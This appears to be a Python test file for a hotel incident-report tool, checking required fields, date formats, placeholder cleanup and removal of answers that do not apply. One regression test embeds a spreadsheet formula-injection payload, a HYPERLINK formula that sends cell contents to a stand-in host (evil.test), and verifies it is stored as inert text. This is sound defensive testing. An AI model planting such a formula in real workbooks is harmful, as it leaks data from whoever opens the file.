import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import fields as F

BASE = dict(
    reported_by_name="Ana Torres", reported_by_title="Front Desk Manager",
    date_of_accident="06/28/2026",
    parent_co_name="Herrick Hospitality LLC", business_address="1 Beach Rd",
    business_city_state_zip="Naples, FL 34102", business_county="Collier",
    business_phone="239-555-0100", location_code="NAP-01",
    loss_location_name="Seaside Hotel Naples", on_insured_premises="yes",
    notification_date="06/29/2026", type_of_loss="injury",
    injured_name="John Q Guest", injured_address="9 Elm St",
    injury_illness_description="The guest reported a bruised wrist.",
    injured_person_doing="The guest stated they were stepping out of the bathtub.",
    accident_description="The guest reported that they slipped in the bathtub of room 204.",
    removed_via_ambulance="no", fatality="no",
    witness1_name="None",
)


def test_complete_record_passes():
    res = F.check_completeness(dict(BASE))
    assert res["complete"], (res["missing"], res["malformed"])


def test_missing_mandatory_blocks():
    rec = dict(BASE)
    del rec["accident_description"]
    res = F.check_completeness(rec)
    assert not res["complete"]
    assert any(m["key"] == "accident_description" for m in res["missing"])


def test_malformed_date_blocks():
    rec = dict(BASE, date_of_accident="yesterday")
    res = F.check_completeness(rec)
    assert not res["complete"]
    assert any(m["key"] == "date_of_accident" for m in res["malformed"])


def test_offsite_fields_conditionally_required():
    rec = dict(BASE, on_insured_premises="no")
    res = F.check_completeness(rec)
    missing = {m["key"] for m in res["missing"]}
    assert {"offsite_address", "offsite_city_state_zip", "offsite_county"} <= missing
    rec.update(offsite_address="2 Pier Ave", offsite_city_state_zip="Naples, FL 34102",
               offsite_county="Collier")
    assert F.check_completeness(rec)["complete"]


def test_property_loss_requires_property_block():
    rec = dict(BASE, type_of_loss="property")
    # injured-person fields no longer required…
    res = F.check_completeness(rec)
    missing = {m["key"] for m in res["missing"]}
    assert "injured_name" not in missing
    # …but the "was a vehicle damaged" gate is, since it drives the rest.
    assert "damaged_property_vehicle" in missing
    # Owner details are NOT required — Marsh doesn't treat Section H as a
    # priority field and asks that missing detail never hold up a filing.
    assert "property_owner_type" not in missing
    rec.update(damaged_property_vehicle="no", property_description="Guest's laptop")
    assert F.check_completeness(rec)["complete"]


def test_picker_dates_are_converted_to_the_carrier_format():
    """Native <input type="date"> submits YYYY-MM-DD and type="time" submits a
    24-hour clock; Broadspire's form wants MM/DD/YYYY and 12-hour."""
    rec = dict(BASE, date_of_accident="2026-07-30", time_of_accident="14:15",
               notification_date="2026-07-30")
    cleaned, changed = F.normalize_dates(rec)
    assert cleaned["date_of_accident"] == "07/30/2026"
    assert cleaned["notification_date"] == "07/30/2026"
    assert cleaned["time_of_accident"] == "2:15 PM"
    assert set(changed) == {"date_of_accident", "time_of_accident", "notification_date"}
    assert F.check_completeness(cleaned)["complete"]


def test_already_correct_dates_are_left_alone():
    rec = dict(BASE, date_of_accident="06/28/2026", time_of_accident="9:05 AM")
    cleaned, changed = F.normalize_dates(rec)
    assert cleaned["date_of_accident"] == "06/28/2026"
    assert cleaned["time_of_accident"] == "9:05 AM"
    assert "date_of_accident" not in changed


def test_unparseable_dates_are_preserved_not_discarded():
    """An odd value off an upload is still the reporter's answer."""
    rec = dict(BASE, date_of_accident="last Tuesday")
    cleaned, changed = F.normalize_dates(rec)
    assert cleaned["date_of_accident"] == "last Tuesday"
    assert F.to_iso_date("last Tuesday") == ""      # form falls back to a text box
    assert not F.check_completeness(cleaned)["complete"]   # still flagged as malformed


def test_water_leak_can_be_filed_without_owner_details():
    """A burst pipe soaking a guest's belongings should file with what the GM
    knows: what broke, what it damaged. Not who legally owns a suitcase."""
    rec = dict(BASE, type_of_loss="property",
               accident_description="Water leaked from the ceiling in room 210 and "
                                    "the guest reported their belongings were wet.",
               damaged_property_vehicle="no",
               property_description="Guest's suitcase and laptop")
    for k in ("injured_name", "injured_address", "injury_illness_description",
              "injured_person_doing", "removed_via_ambulance", "fatality"):
        rec.pop(k, None)
    res = F.check_completeness(rec)
    assert res["complete"], res["missing"]


def test_blank_loss_type_raises_one_error_not_six():
    """An unanswered gate should point at the gate — not demand details about an
    injured person who may not exist."""
    rec = {k: v for k, v in BASE.items() if k != "type_of_loss"}
    missing = {m["key"] for m in F.check_completeness(rec)["missing"]}
    assert "type_of_loss" in missing
    assert not missing & {"injured_name", "injured_address", "removed_via_ambulance",
                          "fatality", "injury_illness_description", "injured_person_doing"}


def test_injury_only_report_drops_property_answers():
    """INC-20260723: an injury report carrying Section G/H answers the reviewer
    then had to clear by hand."""
    rec = dict(BASE, property_owner_type="personally", personal_owner_name="John Q Guest",
               owner_address="9 Elm St", owner_residence_phone="239-555-0111",
               vehicle_plate_state="TN")
    cleaned, dropped = F.strip_inapplicable(rec)
    assert set(dropped) == {"property_owner_type", "personal_owner_name", "owner_address",
                            "owner_residence_phone", "vehicle_plate_state"}
    assert F.check_completeness(cleaned)["complete"]


def test_property_only_report_drops_injured_person_answers():
    """INC-20260724: a parking-lot collision carrying Fatality / ambulance answers."""
    rec = dict(BASE, type_of_loss="property", damaged_property_vehicle="no",
               property_description="Guest's laptop", property_owner_type="personally",
               personal_owner_name="John Q Guest")
    cleaned, dropped = F.strip_inapplicable(rec)
    assert {"fatality", "removed_via_ambulance", "injured_name"} <= set(dropped)
    assert F.check_completeness(cleaned)["complete"]


def test_unanswered_gate_never_discards_answers():
    """Server side stays forgiving: no loss type, nothing thrown away."""
    rec = {k: v for k, v in BASE.items() if k != "type_of_loss"}
    rec["personal_owner_name"] = "John Q Guest"
    cleaned, dropped = F.strip_inapplicable(rec)
    assert dropped == [] and cleaned == rec


def test_placeholder_text_in_optional_phone_fields_cleared():
    """'N/A' in a fax box read as malformed and blocked approval until the
    reviewer blanked it — the most repeated edit in the audit trail."""
    rec = dict(BASE, reported_by_fax="N/A", business_fax="none",
               injured_home_phone="901-555-0100")
    assert not F.check_completeness(rec)["complete"]
    cleaned, dropped = F.clear_placeholders(rec)
    assert set(dropped) == {"reported_by_fax", "business_fax"}
    assert cleaned["injured_home_phone"] == "901-555-0100"   # real values survive
    assert F.check_completeness(cleaned)["complete"]


def test_placeholder_clearing_leaves_required_text_alone():
    """A witness genuinely recorded as "None" is the documented convention."""
    rec = dict(BASE, witness1_name="None")
    cleaned, dropped = F.clear_placeholders(rec)
    assert "witness1_name" not in dropped and cleaned["witness1_name"] == "None"


def test_narrative_text_cannot_become_an_excel_formula():
    """N3 regression: the approved workbook is e-mailed to the carrier and the
    register is opened locally, so reporter text must never land as a formula."""
    import openpyxl, io, outputs
    payload = '=HYPERLINK("http://evil.test/?"&A1,"View claim")'
    rec = dict(BASE, accident_description=payload)

    ws = openpyxl.load_workbook(io.BytesIO(outputs.fill_xlsx(rec))).active
    cell = ws[F.FIELDS_BY_KEY["accident_description"]["cell"]]
    assert cell.data_type == "s", "narrative was written as a formula"
    assert payload in str(cell.value)          # content preserved, just inert

    reg = openpyxl.load_workbook(io.BytesIO(outputs.register_xlsx(
        [dict(incident_id="INC-1", accident_description=payload)]))).active
    assert all(c.data_type != "f" for row in reg.iter_rows() for c in row)


def test_excel_safe_leaves_ordinary_values_alone():
    from outputs import excel_safe
    for v in ["The guest reported a fall.", "901-555-0100", "07/24/2026", "$250", ""]:
        assert excel_safe(v) == v
    for v in ["=cmd", "+1", "-1", "@x"]:
        assert excel_safe(v) == "'" + v


def test_vehicle_details_required_when_vehicle():
    rec = dict(BASE, type_of_loss="property", damaged_property_vehicle="yes",
               property_owner_type="personally", personal_owner_name="John Q Guest")
    missing = {m["key"] for m in F.check_completeness(rec)["missing"]}
    assert {"vehicle_year", "vehicle_make", "vehicle_model"} <= missing
